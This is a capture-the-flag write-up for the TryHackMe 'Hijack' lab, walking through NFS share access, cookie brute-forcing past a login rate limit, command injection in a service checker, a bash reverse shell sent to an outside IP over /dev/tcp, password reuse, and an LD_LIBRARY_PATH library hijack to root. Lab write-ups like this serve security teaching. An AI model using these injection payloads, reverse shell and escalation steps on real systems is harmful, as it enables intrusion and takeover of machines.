# TryHackMe - Hijack

**Target:** 10.49.173.189
**Platform:** TryHackMe
**Flags:** user.txt, root.txt

---

## Recon

Started with a full port scan with service detection:

```
└─$ nmap -Pn -sS -sV -sC -A -T4 -p- 10.49.173.189
...
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Home
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs_acl  2-3 (RPC #100227)
...
```

Four things stand out: FTP, SSH, a web server on port 80, and NFS (rpcbind + nfs_acl on 2049).

FTP does not allow anonymous login:

```
└─$ ftp 10.49.173.189
Name (10.49.173.189:lightningf4st): Anonymous
331 Please specify the password.
Password:
530 Login incorrect.
```

NFS is more interesting, so I checked the exports:

```
└─$ showmount -e 10.49.173.189
Export list for 10.49.173.189:
/mnt/share *
```

The share is exported to everyone. Mounting it:

```
└─$ sudo mount -t nfs 10.49.173.189:/mnt/share /tmp/targetnfs
└─$ ls /tmp/targetnfs
ls: cannot open directory '/tmp/targetnfs': Permission denied
```

The directory is only readable by its owner, which is a local user called `hijack`. I set a password for that user and switched to it:

```
└─$ sudo passwd hijack
passwd: password updated successfully
└─$ su hijack
$ /bin/bash -i
hijack@kali:~/Tryhackme/hijack$ ls /tmp/targetnfs/
for_employees.txt
hijack@kali:~/Tryhackme/hijack$ cat /tmp/targetnfs/for_employees.txt

ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```

## FTP Access

Logged in to FTP as `ftpuser` with the credentials from the NFS share and grabbed the two hidden files in the home directory:

```
└─$ ftp 10.49.173.189
Name (10.49.173.189:lightningf4st): ftpuser
230 Login successful.
ftp> ls -al
-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
ftp> get .from_admin.txt
ftp> get .passwords_list.txt
```

The note from admin:

```
└─$ cat .from_admin.txt
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```

So there is a custom password list for the `admin` account on the website, and the note confirms login attempts are rate limited. The list is 3150 bytes of 20-character random strings:

```
└─$ cat .passwords_list.txt
Vxb38mSNN8wxqHxv6uMX
56J4Zw6cvz8qDvhCWCVy
qLnqTXydnY3ktstntLGu
...
```

## Web Login and Rate Limit

`/login.php` is the admin login. Trying `admin` with a wrong password gets a normal error, but after 5 attempts the account is locked:

```
You have exceeded 5 login attempts. This account has been locked for 126 seconds.
```

Brute forcing the login form directly is not practical with that lockout. The login page is not the weak point though. Looking at the cookies after logging in, `PHPSESSID` is not a random session ID. It is in the format `user:md5_pass`, base64 encoded. That means the server trusts the cookie contents, and `/administration.php` only checks whether the cookie matches an admin session. The rate limit applies to the login form, not to the cookie check, so the cookie can be brute forced instead.

`/administration.php` without a valid cookie returns:

```
Access denied, only the admin can access this page.
```

## Cookie Brute Force

I used Burp Suite Intruder with a sniper attack on the `PHPSESSID` value, using the password list as payloads. Payload processing chains three rules in order:

1. **Hash: MD5** on the password
2. **Add prefix: `admin:`**
3. **Base64-encode** the result

This recreates the cookie format `base64(admin:md5(password))`. The one request that returned a different response length (1202 vs 365 for failures) was the valid password, and loading `/administration.php` with that cookie gave the admin panel:

```
Administration Panel
Services Status Checker
Provide the service name :
```

## Command Injection

The service checker passes the input to a shell command. Entering a normal service name returns its status:

```
* ftp.service
   Loaded: not-found (Reason: No such file or directory)
   Active: inactive (dead)
```

Appending a command with `&&` runs it as well. Setting the service field to `ftp && whoami` returned:

```
* ftp.service
   Loaded: not-found (Reason: No such file or directory)
   Active: inactive (dead)
www-data
```

So the application runs as `www-data`. I used the same `&&` injection to send a reverse shell back to my machine:

```
ftp && bash -c "bash -i >& /dev/tcp/192.168.144.158/4445 0>&1"
```

On the listener:

```
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.144.158] from (UNKNOWN) [10.49.173.189] 48010
bash: no job control in this shell
www-data@Hijack:/var/www/html$
```

## Lateral Movement to rick

Inside `/var/www/html` there is a `config.php` with database credentials:

```
www-data@Hijack:/var/www/html$ cat config.php
<?php
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";
```

The `/etc/passwd` file shows that `rick` is a real local user, and the password is reused for SSH. The shell is not a TTY so `su` fails, so I used SSH instead:

```
└─$ ssh rick@10.49.173.189
rick@10.49.173.189's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
```

Reading the user flag:

```
$ cat user.txt
THM{fdc8cd4cff2c19e0d1022e78481ddf36}
```

## Privilege Escalation

Checking sudo rights for `rick`:

```
$ sudo -l
User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

`rick` can run Apache as root. The `sudo -l` output also shows `env_keep+=LD_LIBRARY_PATH`, meaning `LD_LIBRARY_PATH` survives `sudo`. That means I control which shared libraries root's Apache loads.

Checking the libraries Apache links against:

```
$ ldd /usr/sbin/apache2
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3
	libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0
	libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0
	libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
	...
```

I wrote a malicious shared library that calls `setresuid(0,0,0)` in a constructor, so it runs as soon as it is loaded, and compiled it under the name `libcrypt.so.1`:

```
$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/hijack/exploit.c
```

Then ran Apache as root with `LD_LIBRARY_PATH` pointing at `/tmp`, so the dynamic linker loads my library instead of the real one:

```
$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
/usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
root@Hijack:/tmp/hijack# whoami
root
```

## Root Flag

```
root@Hijack:/tmp/hijack# cd /root
root@Hijack:/root# cat root.txt

██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

THM{b91ea3e8285157eaf173d88d0a73ed5a}
```

---

## Summary

1. Full port scan, found NFS exporting `/mnt/share` to everyone
2. Accessed the share as the `hijack` user, which exposed FTP credentials for `ftpuser`
3. FTP gave the admin hint and the password list
4. Login is rate limited, so brute forced the `PHPSESSID` cookie (`base64(admin:md5(pass))`) on `/administration.php` instead
5. Command injection in the service checker with `&&` gave a shell as `www-data`
6. `config.php` leaked the password for `rick`, used over SSH
7. `sudo` allowed Apache as root with `LD_LIBRARY_PATH` kept, so a malicious `libcrypt.so.1` gave root
